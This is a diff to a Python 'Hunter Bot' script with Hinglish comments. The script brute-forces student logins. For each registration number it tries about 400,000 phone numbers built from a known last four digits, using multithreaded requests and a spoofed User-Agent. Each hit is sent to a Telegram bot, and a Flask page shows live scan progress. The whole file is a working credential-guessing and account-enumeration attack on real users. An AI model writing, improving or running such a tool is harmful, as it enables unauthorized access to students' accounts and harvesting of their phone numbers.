@@ -22,6 +22,15 @@ HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0"
 }
 
+# LIVE STATUS TRACKER (Browser aur Telegram ke liye)
+live_status = {
+    "current_reg": "Starting...",
+    "scanned": 0,
+    "total": 0,
+    "last_phone": "None",
+    "status": "Running"
+}
+
 def send_telegram_msg(text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": text}
@@ -36,38 +45,42 @@ def check(phone, password):
         data = r.json() if r.text else {}
         success = "student" in data or "user" in data or ("token" in data and "name" in data)
         return {"status": r.status_code, "success": success, "phone": phone}
-    except Exception as e:
+    except Exception:
         return {"status": "ERROR", "success": False, "phone": phone}
 
 def process_student(index, reg_no, last4):
-    print(f"\n{'='*50}", flush=True)
-    print(f"[{index}] TARGET: {reg_no} (Ending: {last4})", flush=True)
-    print(f"{'='*50}", flush=True)
+    global live_status
+    live_status["current_reg"] = reg_no
+    live_status["status"] = "Scanning..."
     
     prefixes = [f"{digit}{i:05d}" for digit in ['6', '7', '8', '9'] for i in range(100000)]
     total = len(prefixes)
+    live_status["total"] = total
+    live_status["scanned"] = 0
     
     found_phone = None
-    checked = 0
     
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
         futures = {ex.submit(check, prefix + last4, reg_no): prefix for prefix in prefixes}
         
         for future in as_completed(futures):
-            checked += 1
+            live_status["scanned"] += 1
             res = future.result()
             
             if res["success"]:
                 found_phone = res["phone"]
+                live_status["status"] = f"✅ FOUND: {found_phone}"
                 print(f"\n✅ MATCH FOUND: {found_phone}\n", flush=True)
                 send_telegram_msg(f"[{index}] {reg_no}    {found_phone}  sus")
                 break
             
-            # Har 5000 request ke baad ek summary log
-            if checked % 5000 == 0:
-                print(f"⏳ Progress: {checked} / {total} scanned...", flush=True)
+            # Har 10,000 scan pe Telegram aur Logs me update
+            if live_status["scanned"] % 10000 == 0:
+                print(f"⏳ Scanned: {live_status['scanned']}/{total}", flush=True)
+                send_telegram_msg(f"⏳ Progress ({reg_no}): {live_status['scanned']}/{total} scanned...")
 
     if not found_phone:
+        live_status["status"] = "❌ Not Found"
         print(f"❌ NO MATCH for {reg_no}", flush=True)
         send_telegram_msg(f"[{index}] {reg_no}    no match number found")
         
@@ -91,9 +104,26 @@ def run_hunter():
     except Exception as e:
         print("Error:", e, flush=True)
 
+# Ye route browser mein live status dikhayega
 @app.route('/')
 def home():
-    return "Hunter Bot is running..."
+    return f"""
+    <html>
+    <body style="background-color: #1e1e1e; color: #00ff00; font-family: monospace; padding: 20px;">
+        <h2>💻 LIVE SCANNER STATUS</h2>
+        <hr style="border-color: #333;">
+        <p><b>Target Reg No:</b> {live_status['current_reg']}</p>
+        <p><b>Status:</b> {live_status['status']}</p>
+        <p><b>Total Scanned:</b> {live_status['scanned']:,} / {live_status['total']:,}</p>
+        <p><b>Time:</b> {time.strftime("%Y-%m-%d %H:%M:%S")}</p>
+        <hr style="border-color: #333;">
+        <p style="color: #888;">Auto-refresh every 5 seconds...</p>
+        <script>
+            setTimeout(function(){{ location.reload(); }}, 5000);
+        </script>
+    </body>
+    </html>
+    """
 
 if __name__ == "__main__":
     threading.Thread(target=run_hunter, daemon=True).start()
